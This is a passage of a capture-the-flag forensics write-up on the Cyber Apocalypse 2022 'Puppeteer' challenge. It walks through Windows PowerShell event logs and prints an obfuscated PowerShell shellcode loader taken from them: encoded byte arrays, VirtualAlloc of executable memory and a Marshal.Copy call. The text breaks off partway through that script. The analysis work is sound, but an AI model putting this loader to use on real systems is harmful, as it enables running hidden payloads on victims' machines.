<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Cyber Apocalypse CTF 2022 Writeups | serioton</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ForensicsPuppeteerChallenge Description1Planet Longhir is known for it&amp;#x27;s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced on">
<meta property="og:type" content="article">
<meta property="og:title" content="Cyber Apocalypse CTF 2022 Writeups">
<meta property="og:url" content="https://seriotonctf.github.io/2022/05/19/Cyber-Apocalypse-CTF-2022-Writeups/index.html">
<meta property="og:site_name" content="serioton">
<meta property="og:description" content="ForensicsPuppeteerChallenge Description1Planet Longhir is known for it&amp;#x27;s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced on">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb88b0a3c-3b62-4c82-9da5-4e32c3a281e1%2FUntitled.png?id=e57ffb10-cdb0-47da-b362-6566e2aa8f87&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2">
<meta property="article:published_time" content="2022-05-19T15:39:24.000Z">
<meta property="article:modified_time" content="2024-03-07T13:12:16.094Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="forensics">
<meta property="article:tag" content="reversing">
<meta property="article:tag" content="HTB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb88b0a3c-3b62-4c82-9da5-4e32c3a281e1%2FUntitled.png?id=e57ffb10-cdb0-47da-b362-6566e2aa8f87&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2022/05/19/Cyber-Apocalypse-CTF-2022-Writeups/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Cyber Apocalypse CTF 2022 Writeups',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-07 13:12:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Cyber Apocalypse CTF 2022 Writeups</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2022-05-19T15:39:24.000Z" title="Created 2022-05-19 15:39:24">2022-05-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Puppeteer"><a href="#Puppeteer" class="headerlink" title="Puppeteer"></a>Puppeteer</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Planet Longhir is known for it&#x27;s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation&#x27;s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite&#x27;s location was leaked since it is a top-sercret that only Galactic Federation&#x27;s council is aware of. Help her analyse the Council&#x27;s HQ event logs and solve this mystery.</span><br></pre></td></tr></table></figure>

<p>We are given a zip file to download , when we extract it we get a folder called “Logs” which contains many files with the extension <code>.evtx</code> . </p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd934bb7d-a49d-45c5-b4de-e66fdaa8dab8%2FUntitled.png?id=fa4d75a3-4023-4001-b95f-f2c632dade7d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1460&userId=&cache=v2" alt="forensics"></p>
<p>This challenge is similar to an old challenge in HTB called ****<code>Event Horizon</code> . </p>
<p>In order to view those logs I am going to open them in the <code>Event Viewer</code> for windows. The logs we are particularly interested in are the ones with the <strong>PowerShell</strong> in them</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85b6f035-bcf3-4df7-b9ef-b8257a1b1ae4%2FUntitled.png?id=b634bb80-e70c-49a3-8948-b073bdbc3609&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1370&userId=&cache=v2" alt="forensics"></p>
<p>If we look at the logs above we notice that the <code>Microsoft-Windows-PowerShell%4Operational.evtx</code> is the biggest one in term of size.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F92f42f32-c6c1-489b-8694-59979c2a50ef%2FUntitled.png?id=b7535548-b4e9-45f2-af47-4c186740a06d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1380&userId=&cache=v2" alt="forensics"></p>
<p>I opened it and started going through the events.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F720014ad-a373-431d-9d8f-e74431071aa0%2FUntitled.png?id=27fcb65a-7d76-4db5-903d-9512e8051d24&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>After scrolling through them I noticed this event right here which contains a PowerShell script.</p>
<p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F80c88cae-b9ae-4d66-a065-b7d931247ac8%2FUntitled.png?id=29e9868e-7f8c-48ad-b7f3-45e7c2fec21f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p>
<p>This is the whole script</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage1</span> = <span class="number">0</span>x99, <span class="number">0</span>x85, <span class="number">0</span>x93, <span class="number">0</span>xaa, <span class="number">0</span>xb3, <span class="number">0</span>xe2, <span class="number">0</span>xa6, <span class="number">0</span>xb9, <span class="number">0</span>xe5, <span class="number">0</span>xa3, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xe1, <span class="number">0</span>xb7, <span class="number">0</span>x8e, <span class="number">0</span>xa5, <span class="number">0</span>xb9, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xb3;</span><br><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage2</span> = <span class="number">0</span>xac, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xe2, <span class="number">0</span>xb2, <span class="number">0</span>xe0, <span class="number">0</span>xa5, <span class="number">0</span>xa2, <span class="number">0</span>xa4, <span class="number">0</span>xbb, <span class="number">0</span>x8e, <span class="number">0</span>xb7, <span class="number">0</span>xe1, <span class="number">0</span>x8e, <span class="number">0</span>xe4, <span class="number">0</span>xa5, <span class="number">0</span>xe1, <span class="number">0</span>xe1;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tNZvQCljVk</span> = <span class="built_in">Add-Type</span> <span class="literal">-memberDefinition</span> <span class="variable">$OleSPrlmhB</span> <span class="literal">-Name</span> <span class="string">&quot;Win32&quot;</span> <span class="literal">-namespace</span> Win32Functions <span class="literal">-passthru</span>;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$HVOASfFuNSxRXR</span> = <span class="number">0</span>x2d,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x35,<span class="number">0</span>x21,<span class="number">0</span>x39,<span class="number">0</span>x1d,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x80,<span class="number">0</span>x90,<span class="number">0</span>x81,<span class="number">0</span>x83,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x03,<span class="number">0</span>xb4,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xb1,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xc9,<span class="number">0</span>x80,<span class="number">0</span>x87,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xf1,<span class="number">0</span>x99,<span class="number">0</span>xde,<span class="number">0</span>x66,<span class="number">0</span>x9b,<span class="number">0</span>x9b,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>xa3,<span class="number">0</span>x81,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x11,<span class="number">0</span>x7d,<span class="number">0</span>xed,<span class="number">0</span>xb0,<span class="number">0</span>xad,<span class="number">0</span>xd3,<span class="number">0</span>xfd,<span class="number">0</span>xf1,<span class="number">0</span>x90,<span class="number">0</span>x10,<span class="number">0</span>x18,<span class="number">0</span>xdc,<span class="number">0</span>x90,<span class="number">0</span>xd0,<span class="number">0</span>x10,<span class="number">0</span>x33,<span class="number">0</span>x3c,<span class="number">0</span>x83,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xf1,<span class="number">0</span>x90,<span class="number">0</span>x80,<span class="number">0</span>x5a,<span class="number">0</span>x93,<span class="number">0</span>xed,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>xb7,<span class="number">0</span>x50,<span class="number">0</span>xa9,<span class="number">0</span>xc9,<span class="number">0</span>xda,<span class="number">0</span>xd3,<span class="number">0</span>xde,<span class="number">0</span>x54,<span class="number">0</span>xa3,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x5a,<span class="number">0</span>x51,<span class="number">0</span>x59,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x99,<span class="number">0</span>x54,<span class="number">0</span>x11,<span class="number">0</span>xa5,<span class="number">0</span>xb6,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x5a,<span class="number">0</span>x99,<span class="number">0</span>xc9,<span class="number">0</span>x81,<span class="number">0</span>x95,<span class="number">0</span>x5a,<span class="number">0</span>x91,<span class="number">0</span>xf1,<span class="number">0</span>x98,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x32,<span class="number">0</span>x87,<span class="number">0</span>x99,<span class="number">0</span>x2e,<span class="number">0</span>x18,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x90,<span class="number">0</span>x5a,<span class="number">0</span>xe5,<span class="number">0</span>x59,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x07,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x11,<span class="number">0</span>x90,<span class="number">0</span>x10,<span class="number">0</span>x18,<span class="number">0</span>xdc,<span class="number">0</span>x7d,<span class="number">0</span>x90,<span class="number">0</span>xd0,<span class="number">0</span>x10,<span class="number">0</span>xe9,<span class="number">0</span>x31,<span class="number">0</span>xa4,<span class="number">0</span>x20,<span class="number">0</span>x9d,<span class="number">0</span>xd2,<span class="number">0</span>x9d,<span class="number">0</span>xf5,<span class="number">0</span>xd9,<span class="number">0</span>x94,<span class="number">0</span>xe8,<span class="number">0</span>x00,<span class="number">0</span>xa4,<span class="number">0</span>x09,<span class="number">0</span>x89,<span class="number">0</span>x95,<span class="number">0</span>x5a,<span class="number">0</span>x91,<span class="number">0</span>xf5,<span class="number">0</span>x98,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>xb7,<span class="number">0</span>x90,<span class="number">0</span>x5a,<span class="number">0</span>xdd,<span class="number">0</span>x99,<span class="number">0</span>x95,<span class="number">0</span>x5a,<span class="number">0</span>x91,<span class="number">0</span>xcd,<span class="number">0</span>x98,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x90,<span class="number">0</span>x5a,<span class="number">0</span>xd5,<span class="number">0</span>x59,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x8f,<span class="number">0</span>x88,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x8b,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x88,<span class="number">0</span>x90,<span class="number">0</span>x8b,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x3d,<span class="number">0</span>xf1,<span class="number">0</span>x90,<span class="number">0</span>x83,<span class="number">0</span>x2e,<span class="number">0</span>x31,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x88,<span class="number">0</span>x8b,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>xc3,<span class="number">0</span>x38,<span class="number">0</span>x9a,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x8c,<span class="number">0</span>x98,<span class="number">0</span>x6f,<span class="number">0</span>xa6,<span class="number">0</span>xa2,<span class="number">0</span>xe3,<span class="number">0</span>x8e,<span class="number">0</span>xe2,<span class="number">0</span>xe3,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x87,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x37,<span class="number">0</span>x99,<span class="number">0</span>x50,<span class="number">0</span>x3d,<span class="number">0</span>x71,<span class="number">0</span>xd0,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x34,<span class="number">0</span>x98,<span class="number">0</span>x6d,<span class="number">0</span>xd3,<span class="number">0</span>xd1,<span class="number">0</span>xd4,<span class="number">0</span>xe8,<span class="number">0</span>x11,<span class="number">0</span>x79,<span class="number">0</span>xd1,<span class="number">0</span>xc3,<span class="number">0</span>x90,<span class="number">0</span>x85,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x35,<span class="number">0</span>x9d,<span class="number">0</span>x58,<span class="number">0</span>x20,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x9d,<span class="number">0</span>xa6,<span class="number">0</span>xf7,<span class="number">0</span>xd6,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x9d,<span class="number">0</span>x58,<span class="number">0</span>x3b,<span class="number">0</span>xb9,<span class="number">0</span>xd0,<span class="number">0</span>xd0,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x88,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xf8,<span class="number">0</span>x51,<span class="number">0</span>xba,<span class="number">0</span>xd1,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>xbb,<span class="number">0</span>xdb,<span class="number">0</span>x90,<span class="number">0</span>x8f,<span class="number">0</span>x81,<span class="number">0</span>x81,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x11,<span class="number">0</span>x99,<span class="number">0</span>x2e,<span class="number">0</span>x11,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x13,<span class="number">0</span>x99,<span class="number">0</span>x2e,<span class="number">0</span>x11,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x10,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x3b,<span class="number">0</span>xde,<span class="number">0</span>x0e,<span class="number">0</span>x31,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x16,<span class="number">0</span>xbb,<span class="number">0</span>xc1,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x9d,<span class="number">0</span>x58,<span class="number">0</span>x33,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x28,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x48,<span class="number">0</span>x74,<span class="number">0</span>xa5,<span class="number">0</span>xb0,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x54,<span class="number">0</span>x11,<span class="number">0</span>xa5,<span class="number">0</span>xdb,<span class="number">0</span>x98,<span class="number">0</span>x2e,<span class="number">0</span>x1f,<span class="number">0</span>xa4,<span class="number">0</span>x34,<span class="number">0</span>x39,<span class="number">0</span>x42,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x3d,<span class="number">0</span>xc1,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x33,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>xbb,<span class="number">0</span>xd5,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x28,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xd3,<span class="number">0</span>x08,<span class="number">0</span>x19,<span class="number">0</span>x8e,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x52,<span class="number">0</span>x29,<span class="number">0</span>xd1,<span class="number">0</span>xaf,<span class="number">0</span>x84,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x15,<span class="number">0</span>xf1,<span class="number">0</span>x8f,<span class="number">0</span>x58,<span class="number">0</span>x27,<span class="number">0</span>xbb,<span class="number">0</span>x91,<span class="number">0</span>x90,<span class="number">0</span>x88,<span class="number">0</span>xb9,<span class="number">0</span>xd1,<span class="number">0</span>xc1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x23,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x89,<span class="number">0</span>x75,<span class="number">0</span>x82,<span class="number">0</span>x34,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x12,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x16,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x21,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x0b,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x28,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xd3,<span class="number">0</span>x08,<span class="number">0</span>x19,<span class="number">0</span>x8e,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x52,<span class="number">0</span>x29,<span class="number">0</span>xd1,<span class="number">0</span>xac,<span class="number">0</span>xf9,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x86,<span class="number">0</span>x88,<span class="number">0</span>xb9,<span class="number">0</span>xd1,<span class="number">0</span>x91,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>xbb,<span class="number">0</span>xd1,<span class="number">0</span>x8b,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xda,<span class="number">0</span>xfe,<span class="number">0</span>xde,<span class="number">0</span>xe1,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x86,<span class="number">0</span>x88,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xa4,<span class="number">0</span>xbf,<span class="number">0</span>x9c,<span class="number">0</span>xb0,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x98,<span class="number">0</span>x2e,<span class="number">0</span>x1f,<span class="number">0</span>x38,<span class="number">0</span>xed,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x12,<span class="number">0</span>x99,<span class="number">0</span>xf8,<span class="number">0</span>x17,<span class="number">0</span>x99,<span class="number">0</span>x54,<span class="number">0</span>x27,<span class="number">0</span>xa4,<span class="number">0</span>x65,<span class="number">0</span>x90,<span class="number">0</span>x2e,<span class="number">0</span>x36,<span class="number">0</span>x89,<span class="number">0</span>xbb,<span class="number">0</span>xd1,<span class="number">0</span>x88,<span class="number">0</span>x98,<span class="number">0</span>x16,<span class="number">0</span>x13,<span class="number">0</span>x21,<span class="number">0</span>x64,<span class="number">0</span>x73,<span class="number">0</span>x87,<span class="number">0</span>x2e,<span class="number">0</span>x04;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">array</span>]::Reverse(<span class="variable">$stage2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hRffYLENA</span> = <span class="variable">$tNZvQCljVk::VirtualAlloc</span>(<span class="number">0</span>,[<span class="type">Math</span>]::Max(<span class="variable">$HVOASfFuNSxRXR</span>.Length,<span class="number">0</span>x1000),<span class="number">0</span>x3000,<span class="number">0</span>x40);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stage3</span> = <span class="variable">$stage1</span> + <span class="variable">$stage2</span>;</span><br><span class="line"></span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span 